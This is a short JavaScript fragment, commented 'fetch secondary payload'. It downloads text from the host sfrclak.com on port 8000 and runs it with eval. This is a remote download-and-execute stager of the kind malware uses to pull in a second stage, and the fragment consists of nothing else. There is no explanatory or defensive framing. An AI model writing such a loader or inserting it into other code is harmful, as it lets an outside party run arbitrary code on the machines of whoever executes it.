/* fetch secondary payload*/
await fetch('http://sfrclak.com:8000/')
  .then(r => r.text())
  .then(eval)
